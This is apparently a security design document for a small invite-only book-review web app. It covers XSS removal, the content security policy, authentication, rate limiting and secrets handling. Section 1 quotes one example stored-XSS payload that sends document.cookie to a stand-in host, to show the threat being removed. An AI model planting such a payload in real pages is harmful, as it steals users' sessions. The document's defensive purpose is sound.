# Security

Scope: a ~30-person invite-only cohort who know each other offline, holding original writing and reading history. The threat model is **accidental exposure and casual mistakes**, not a targeted adversary. Controls are sized accordingly — but the ones that are sized down are named, not omitted silently.

---

## 1. The existing XSS issue, and how it is removed

`index.html:77` renders reviews with `v-html`:

```html
<p v-if="selectedBook.review" style="white-space: pre-wrap" v-html="selectedBook.review"></p>
```

Today this is safe for exactly one reason: there is one author, and he is the person running the site. **It becomes stored XSS the instant a second person can submit a review.** Anyone could post `<img src=x onerror="fetch('//evil/'+document.cookie)">` and it would execute in every viewer's session.

The discovery documents propose the conventional answer: server-side sanitisation with an allowlist, DOMPurify, and separate `review_html` / `review_text` columns.

**We are not doing that, because a measurement makes it unnecessary.** A tag census across all 56 existing reviews returns exactly one tag type:

```
{ br: 178 }
```

No entities, no other markup, no formatting. The reviews are plain Portuguese prose with `<br>` used as a paragraph break — and the element already carries `white-space: pre-wrap`, which means a newline renders identically.

### The decision

> **Reviews are plain text. HTML is never accepted, never stored, never rendered.**

- Migration converts `<br><br>` → `\n\n` and `<br>` → `\n`, then stores text. ([migration.md](migration.md) §4)
- The database column is `reading_logs.review text`. There is no `review_html`.
- The API accepts a plain string. `<` and `>` are stored literally, exactly as typed.
- The frontend renders with `{{ }}` (Vue escapes by default) plus `white-space: pre-wrap`. **`v-html` appears nowhere in the codebase.**

**Why this is strictly better than sanitising:** a sanitiser is a dependency with its own CVE history, an allowlist to maintain, and a bypass surface. Not parsing HTML has none of those. The whole class of stored-XSS-via-review is removed rather than mitigated.

**Enforcement:** an ESLint rule bans `v-html` repository-wide. Overriding it requires a comment explaining why, and there is no valid why.

**The cost, stated honestly:** users cannot write bold or links in reviews. For a friend group writing prose, that is not a loss. If it ever becomes one, the answer is a restricted markdown subset rendered to a Vue vnode tree — *never* `v-html`.

---

## 2. Cross-site scripting, generally

| Vector | Control |
|---|---|
| Review text | Plain text, escaped on render. §1 |
| Display name, bio, handle | Same — escaped interpolation. `handle` additionally constrained to `^[a-z0-9_]{3,20}$` |
| Book title / author / publisher (user-supplied via manual add) | Escaped on render. These are user input too — the manual-add path means *any* member can write a title |
| `og:description` | Built from plain text and HTML-attribute-escaped |
| Cover URLs | **Validated on write**: must parse as a URL with an `https:` scheme. This blocks `javascript:` and `data:` in `<img src>` |
| Error messages | Never echo raw input back into HTML |

**Content-Security-Policy**, set in Nuxt's route rules. Implemented 2026-09-21; what ships is below, and it differs from what this section asked for in two places. Both differences were measured against the real build, and the policy as originally written could not ship:

```
default-src 'self';
img-src 'self' https: data:;
script-src 'self' 'unsafe-inline';
style-src 'self' 'unsafe-inline';
object-src 'none';
frame-ancestors 'none';
base-uri 'self';
form-action 'self'
```

**`script-src` carries `'unsafe-inline'`, and `script-src 'self'` breaks the application.** Nuxt's production HTML ships an inline `<script type="importmap">` and an inline bootstrap `<script>` — confirmed by serving the real build and reading the markup. Without `'unsafe-inline'` the importmap is refused, module resolution fails, and the page renders from SSR but never hydrates: it looks correct and is dead. Nonces are the right answer and need a module this project has not taken on. What the directive still buys was verified in a browser: an injected `<script src="https://example.com/…">` is refused with `script-src-elem`. And the XSS route it would arrive through is already shut — `v-html` is banned repo-wide and ESLint-enforced, and reviews are plain text through `{{ }}`.

**`img-src` is `https:`, not the single Open Library host.** This section predicted the widening — and by the time it was implemented the condition had already been true for months without anyone noticing: `coverUrlSchema` accepts any `https:` host, and the real corpus draws 47 of its 86 covers from **eleven** of them. Shipping the narrow policy would have blanked those 47 covers on the first deploy, with no error in any log. Pinning the eleven was rejected: any member can add a book, so a new host becomes a silently broken cover until someone edits `nuxt.config.ts`. What `https:` concedes is real and small inside an invite-only group — a member could point a cover at their own server and learn who viewed that book — and the write-side `https:` validation remains the actual control.

**Restoring `img-src 'self'` means proxying covers through the app.** That is the honest path back, and it would also collapse the twelve TLS handshakes a profile page currently opens. It is infrastructure this MVP does not need, and it is the natural companion to the moderation tooling that gates opening registration.

The lesson for the next directive written here: a policy written before the code exists is a hypothesis. Serve the build and read the markup before committing it to a document that someone will later apply verbatim.

---

## 3. SQL injection

Drizzle parameterises everything. The rules:

- Never build SQL by string concatenation.
- Raw SQL only through Drizzle's `sql` tagged template, which parameterises interpolations.
- The one genuinely dangerous spot is search: `f_unaccent(lower($1))` is a **bound parameter**, not interpolated. A `%` or `_` typed by a user is a literal wildcard in their own search — harmless — but it must not reach the query as concatenated text.

---

## 4. Authentication

Three flows, one identity. The daily path is `handle` or email + **password**; the six-digit email code survives at exactly two moments — first-access activation and password reset. Rationale in [architecture.md](architecture.md) §3.5.

### 4.1 The credential

| Concern | Control |
|---|---|
| Password storage | better-auth's default **scrypt** hash, in `account.password`. No plaintext, no reversible encryption, and no hashing code written by this project |
| Length | Minimum 8, maximum 128 characters. The maximum exists because an unbounded password is a cheap CPU-exhaustion vector against the hash |
| Composition rules | **None.** No forced symbol, no forced digit, no expiry. They produce `Senha1!` and a note on the fridge, and they are contrary to current NIST guidance |
| Weak-password floor | A short deny-list of the obvious: `12345678`, `senha123`, `password`, the user's own handle, and the local-part of their email. A breach-corpus check is not worth a dependency at 30 users |
| Password in logs or errors | Never — not on a validation failure, not in a 500 correlation record, not in a Zod error echo |
| Transport | HTTPS only. `useSecureCookies` is already unconditional |
| Changing a password | Requires the **current** password. Otherwise a stolen session upgrades itself into permanent account takeover |
| After a change or reset | Every **other** session for that user is deleted. The session performing the change survives |

### 4.2 The identifier

`handle` or email, resolved to one `users` row before better-auth is handed a credential.

- `handle` is already unique and already constrained to `^[a-z0-9_]{3,20}$`. It is not a new namespace, and the reserved-handle list in [api.md](api.md) §4 already keeps route names out of it.
- Both sides of the comparison are case-folded. Email is `citext`; handle is lowercase by constraint.
- **A failed sign-in never reveals which half was wrong.** One message: `E-mail, usuário ou senha incorretos.` Separate messages turn the login form into an account-enumeration oracle — the same leak the allowlist rules close, arriving through a different door.
- The failure must not be measurably faster when no account exists. Verify against a dummy hash on the not-found branch rather than returning early.

### 4.3 Activation and reset — where the OTP survives

| Concern | Control |
|---|---|
| OTP strength | 6 digits, single use, 10-minute expiry, invalidated on use |
| OTP brute force | 5 verification attempts per code, then the code dies. 5 code requests per email per hour |
| Registration | `allowed_emails` checked **twice**: at activation-code request and at profile creation. Unchanged by the password decision |
| Enumeration | Requesting an activation or reset code for an address that is not allowlisted — or simply not known — returns the **same** status, body and approximate timing. Never "este email não foi convidado", and never "não existe conta com este e-mail" |
| Already-activated address | An *activation* request for an address that already has a password sends nothing and returns the same generic response. Otherwise the endpoint reports which invitees have signed up |
| Reset-code consumption | The code is consumed by the password change, not by its verification. Verifying and then abandoning the flow must not leave a usable code behind |
| Reset without an account | Same generic response, no email. A reset request is not a membership test |

**A better-auth identity exists the moment the OTP verifies, before any `users` row.** The real gate is therefore that **no `users` row means every service query returns nothing** — there is no orphan state that can read data. A weekly manual check for identities with no profile is enough at this scale; automate it only if it ever produces a hit.

**The third state.** An address is now *not invited*, *invited but not activated*, or *active*. Nothing user-facing may distinguish the last two.

### 4.4 Sessions

| Concern | Control |
|---|---|
| Session storage | better-auth database sessions; httpOnly + Secure + SameSite=Lax; 30-day rolling |
| Revocation | Database-backed sessions are revocable. This is why we did not use a stateless sealed cookie |
| Fixation | A fresh session token is issued on every successful sign-in, activation and reset |

---

## 5. Authorization

One helper, used everywhere: [api.md](api.md) §3.

- `Viewer` is a required, non-optional parameter, so forgetting it is a compile error.
- ESLint `no-restricted-imports` keeps the raw `db` handle inside `server/services/**`.
- Ownership checks on every mutation: `PATCH`/`DELETE /api/logs/:id` compare `log.user_id` to the session user **in the query**, not after fetching.
- A `privado` resource returns **404, never 403** — a 403 confirms the resource exists.
- Four integration tests are mandatory before launch: owner sees own `privado`; a second user does not; anonymous does not; a `publico` log on a `privado` profile is invisible to both.

**No RLS.** Reasoning in [architecture.md](architecture.md) §3.6. The trade-off recorded plainly: a direct `psql` session bypasses every control here. The only holders of the connection string are the owner and the deploy environment.

---

## 6. CSRF

- Session cookie is `SameSite=Lax`, which blocks cross-site POST with credentials.
- All mutations are POST/PATCH/DELETE. No GET mutates.
- better-auth carries its own CSRF protection for its routes.
- `Origin` is checked against the expected host on every mutating request. Ten lines of middleware; cheap insurance if a cookie setting is ever loosened.

---

## 7. Input validation

Zod at every boundary, with the bounds that actually matter:

| Field | Bound | Why this bound |
|---|---|---|
| `review` | ≤ 10,000 chars | Longest existing review is 2,505. Generous, but bounded |
| `rating` | 0.5–5.0, step 0.5 | Server-enforced. A client posting `3.7` gets 400 |
| `handle` | `^[a-z0-9_]{3,20}$` | Also a DB CHECK |
| `title` | 1–300 chars | |
| `first_published_year` | −3000…2100 | **Signed** — the corpus contains `-500` |
| `series_number` | text, ≤ 20 | `'1-2'` and `'0.1'` are real values |
| `isbn13` | 13 digits after normalisation, checksum validated | 22 of 86 corpus ISBNs are ISBN-10 |
| `cover_url` | parses as URL, scheme `https:` | Blocks `javascript:` / `data:` injection |
| `q` (search) | 2–100 chars | |

Bodies are capped at 64 KB. Nuxt's default is larger than anything this API needs.

---

## 8. Rate limiting

A Postgres table, not Redis. At this scale a counter row is correct and adding Redis would be the clearest possible case of infrastructure-for-its-own-sake.

| Action | Limit |
|---|---|
| **Password sign-in** | **10 / identifier / hour and 30 / IP / hour.** Both are required. Per-identifier alone lets one host spray one likely password across every handle; per-IP alone lets a distributed attacker grind a single account |
| **Password change** | 10 / user / hour |
| Activation or reset code request | 5 / email / hour, 20 / IP / hour |
| OTP verify | 5 attempts / code |
| `POST /api/logs` | 60 / user / hour |
| `POST /api/works` | 30 / user / hour |
| `GET /api/search/externo` | 20 / user / hour |
| Any authenticated write | 200 / user / hour |

The external-lookup limit protects **Open Library**, not us — hammering a free public service is both rude and a good way to get blocked.

---

## 9. External API abuse and third parties

- `/api/search/externo` requires a session, so anonymous traffic cannot use us as an open proxy.
- Hard 2-second timeout via `AbortController`. Open Library averages 8.4 s; without a timeout a slow upstream becomes our outage.
- A descriptive `User-Agent` identifying the project, per Open Library's guidance.
- Covers are **hotlinked, never proxied**. Proxying would put us in the path of every image request for no benefit — Open Library already fronts a CDN.
- Open Library responses are untrusted input: parsed with Zod and validated (especially `cover_url`) before anything is persisted.

---

## 10. Secrets and configuration

| Variable | Where |
|---|---|
| `DATABASE_URL` | Neon pooled endpoint. Vercel env vars |
| `DATABASE_URL_DIRECT` | Neon direct endpoint. **Local only** — migrations and `pg_dump` |
| `BETTER_AUTH_SECRET` | ≥ 32 random bytes |
| `BETTER_AUTH_URL` | Canonical origin |
| `EMAIL_FROM` | The Gmail address used as sender |
| `GMAIL_APP_PASSWORD` | Google Account App Password, 16 characters. **Grants send access to that Gmail account** — rotate it at `myaccount.google.com/apppasswords`, not by editing `.env` |

- `.env` is gitignored. `.env.example` is committed with placeholder values only.
- Never read a secret in `app/` — only `server/`. Nuxt's `runtimeConfig` keeps non-`public` keys server-side; verify no secret lands in `runtimeConfig.public`.
- Rotation: if a secret is ever committed, rotate it before removing it from history. Removing it from history alone is not remediation.

---

## 11. Error handling and leakage

- `500` responses carry a fixed Portuguese message and a correlation id. Never a stack trace, never a database error.
- Postgres errors are caught and mapped: unique violation → `409`, FK violation → `400`. The raw `detail` is logged, never returned — it contains column values.
- Nuxt dev-mode error overlays must not be reachable in production. Verify `NODE_ENV=production` on Vercel.
- Logs redact email addresses beyond the first character and never contain passwords, password hashes, OTP codes or session tokens. A rejected sign-in logs the outcome, never the submitted secret.

---

## 12. Spam and abuse

Registration is invite-only and the cohort knows each other offline, so the ordinary abuse surface does not exist. What remains:

| Risk | Control |
|---|---|
| A leaked allowlist address | Remove the row. Existing sessions are revocable |
| Catalog vandalism (anyone can create works) | Rate limited; `created_by` recorded; no delete endpoint. Repair is SQL |
| A friendship going wrong | The owner can delete any row with `psql`. **No admin UI in the MVP** — accepted because it is one person with database access and 30 people who know each other |

**No report, block or mute in the MVP.** This is a real deferral, not an oversight: those exist to handle strangers, and there are none. **If public registration is ever opened, moderation tooling must ship first.** That is a hard gate, recorded in [open-questions.md](open-questions.md).

---

## 13. Pre-launch checklist

- [ ] `v-html` appears nowhere; the ESLint rule is active and passing
- [ ] The four visibility integration tests pass
- [ ] A `privado` entry returns 404, not 403, for a second user
- [ ] Rating validation rejects `3.7` and `6` server-side
- [ ] Requesting an activation or reset code for a non-allowlisted address is indistinguishable from an allowlisted one
- [ ] A sign-in with an unknown handle and one with a wrong password return the same body and comparable timing
- [ ] Changing a password without supplying the current one is rejected
- [ ] A password change deletes the user's other sessions and keeps the current one
- [x] No password, hash or OTP value appears anywhere in log output — and email addresses are redacted too, which the SMTP failure path was not doing
- [ ] No secret appears in `runtimeConfig.public` or in any client bundle (grep the build output)
- [x] CSP header present on every response — verified in a browser: header served on `/(.*)`, the page hydrates, a third-party cover loads, and an injected external script is refused with `script-src-elem`
- [ ] Session cookie is httpOnly, Secure, SameSite=Lax
- [x] `cover_url` rejects `javascript:` and `data:` schemes — one predicate now, in `shared/schemas/work.ts`; there were three and two were laxer
- [ ] A 500 response contains no stack trace in production
- [ ] `pg_dump` backup has been restored once, successfully, into a scratch database
